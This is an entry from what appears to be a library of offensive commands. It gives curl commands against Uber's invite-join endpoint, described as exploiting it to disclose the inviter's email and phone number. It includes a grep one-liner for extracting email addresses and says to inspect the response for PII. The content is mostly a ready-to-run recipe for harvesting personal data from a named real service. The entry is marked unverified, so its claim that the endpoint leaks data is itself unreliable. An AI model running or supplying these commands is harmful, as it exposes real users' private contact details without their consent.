---
id: cmd-curl-uber-join
data: >-
  curl "https://www.uber.com/a/join?invite_code=EXAMPLE_INVITE_CODE" -o
  response.html
tags:
  - recon
  - web
  - disclosure
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:52.052Z'
verified: false
validated: true
submitted: true
---
# curl-access-uber-join

## Command

```bash
curl "https://www.uber.com/a/join?invite_code=EXAMPLE_INVITE_CODE" -o response.html
```

## Description

This command uses curl to perform an unauthenticated GET request to Uber's invite join endpoint, exploiting it to disclose the inviter's email and/or phone number. Replace EXAMPLE_INVITE_CODE with a valid code. It's useful for testing information disclosure in public web endpoints.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `invite_code` | The Uber invite code to query (e.g., a 12-character alphanumeric string) | Yes |
| `-o response.html` | Output file for the response (optional, for offline inspection) | No |

## Examples

### Basic Usage

```bash
curl "https://www.uber.com/a/join?invite_code=ABC123DEF456"
```

### Advanced Usage

```bash
curl -s "https://www.uber.com/a/join?invite_code=ABC123DEF456" | grep -i email
```

> Pipes output to grep for immediate extraction of email patterns.

## Expected Output

The command returns the HTML of the join page, which includes visible or embedded user contact information like "Email: user@example.com" or phone numbers in form pre-fills. No errors if the code is valid; inspect for PII.

## Related

- [[Related Procedure|procedures/Retrieve-User-Contact-via-Invite-Code]]
